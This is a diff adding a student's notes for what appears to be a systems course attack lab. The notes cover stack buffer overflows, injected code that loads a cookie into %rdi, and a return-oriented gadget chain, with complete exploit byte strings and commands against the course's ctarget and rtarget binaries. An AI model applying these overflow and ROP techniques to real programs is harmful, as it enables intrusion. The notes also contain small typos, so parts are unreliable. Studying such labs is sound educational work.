@@ -1,0 +1,39 @@
+Phase 1: trying to overflow the stack with a string and change the return address of getbuf function to the address of touch1 function to call the function touch1. Disasemble getbuf and you see that you need a buffer of 0x18 or 24 and then just the touch 1 address. We then get out cookie
+
+ 
+Phase 2: "Recall that the first argument to a function is passed in register %rdi." So we need to modify the %rdi register and store our cookie in there. make new file and write assembly code that moves the cookie into %rdi "movq $0x2a8f07a2, %rdi" ** thats the cookie
+we then make a text file in which we set our cookie with the 0x18 buffer and then try to move this into %rsp so that the function calls this to set the cookie. than we can then call touch 2 after it is set. to find the return address of rsp we do x/s $rsp = 0x55633698
+****gcc -c phase2.s
+****objdump -d phase2.o  > phase2.d      This is how we get our cooke we do this for 3 as well
+48 c7 c7 a2 07 8f 2a c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+98 36 63 55 00 00 00 00 /* address of register %rsp */
+96 13 40 00 00 00 00 00 /*address of touch2 function */
+-----
+./hex2raw < phase2.txt > raw-phase2.txt
+./ctarget < raw-phase2.txt  *** to run it
+
+
+Phase 3: Same thing but now store the cookie after touch 3 so we need more buffer. we need the the originally 0x18 buffer and then 8 bytes for the touch 3 address and 8 bytes for the return address of %rsp which is 0x28 or 40 in decimal. we add 0x28 to the return address of rsp from last question 0x55633698 + 0x28 = 0x556336C0. we write the assembly code: "movq $0x556336C0, %rdi" this gives us the address where our cookie is. 
+48 c7 c7 c0 36 63 55 c3 /*rsp + 28 the address where the cookie is present*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+98 36 63 55 00 00 00 00 /* return address ($rsp)*/
+a7 14 40 00 00 00 00 00 /* touch3 address
+32 61 38 66 30 37 61 32 /* cookie string after using the converter to text format! */
+
+
+Phase 4: need to do this first: objdump -d rtarget > rtarget_dump.txt to get the .  this is different there is no fixed address to put our code into. we use rtarget now instead of ctarget. 
+-popq %rdi is given in the the pdf and it's byte representation is 5f, since we don't have 5f byte in the dump file, we will look for a substitute which is popq %rax% with byte representation of 58. look for 58 which I found at the address 0x401544. 
+-The other instruction you need is: movq %rax %edi and it's byte representation is 48 89 c7 c3 which is referenced in the pdf. found this at 0x401558
+- now since both are shifted 2 bytes from the start we musts add 0x2 to each of them before putting them in the exploit string
+- now we have 0x401544 + 0x2 = 0x401546 &&&&&& 0x401558 + 0x2 = 0x40155a
+- put these into the exploit string 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 24 bytes of padding */
+46 15 40 00 00 00 00 00 /* gadget 1: popq %rax address starts at last byte */
+a2 07 8f 2a 00 00 00 00 /* cookie */
+5a 15 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
+96 13 40 00 00 00 00 00 /* touch2 address  */
